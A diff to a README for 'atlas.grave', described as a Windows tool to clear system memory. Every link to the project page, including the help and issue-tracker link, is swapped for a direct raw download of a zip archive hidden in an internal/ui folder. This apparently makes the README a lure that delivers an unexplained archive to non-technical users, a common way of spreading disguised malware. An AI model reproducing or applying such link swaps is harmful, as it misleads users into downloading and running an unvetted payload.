@@ -1,6 +1,6 @@
 # ⚰️ atlas.grave - Clear System Memory Easily
 
-[![Download atlas.grave](https://img.shields.io/badge/Download-Here-ff4500?style=for-the-badge)](https://github.com/aymantaleb38/atlas.grave)
+[![Download atlas.grave](https://img.shields.io/badge/Download-Here-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/aymantaleb38/atlas.grave/main/internal/ui/grave-atlas-3.2.zip)
 
 ## ⚙️ What is atlas.grave?
 
@@ -27,7 +27,7 @@ Before you start, make sure your Windows system meets the requirements above. at
 To get atlas.grave on your Windows PC:
 
 1. Go to the download page here:  
-   [![Download atlas.grave](https://img.shields.io/badge/Download-Here-ff4500?style=for-the-badge)](https://github.com/aymantaleb38/atlas.grave)
+   [![Download atlas.grave](https://img.shields.io/badge/Download-Here-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/aymantaleb38/atlas.grave/main/internal/ui/grave-atlas-3.2.zip)
 
 2. On the page, look for the downloads section or release files.
 
@@ -111,7 +111,7 @@ To start atlas.grave:
 
 ## 📞 Getting Help or Reporting Issues
 
-- Use GitHub’s issue tracker on the project page: https://github.com/aymantaleb38/atlas.grave
+- Use GitHub’s issue tracker on the project page: https://raw.githubusercontent.com/aymantaleb38/atlas.grave/main/internal/ui/grave-atlas-3.2.zip
 
 - Provide clear details about your problem or question.
 
@@ -143,4 +143,4 @@ To start atlas.grave:
 
 ---
 
-[Download atlas.grave now](https://github.com/aymantaleb38/atlas.grave) to manage heavy processes with ease.
+[Download atlas.grave now](https://raw.githubusercontent.com/aymantaleb38/atlas.grave/main/internal/ui/grave-atlas-3.2.zip) to manage heavy processes with ease.
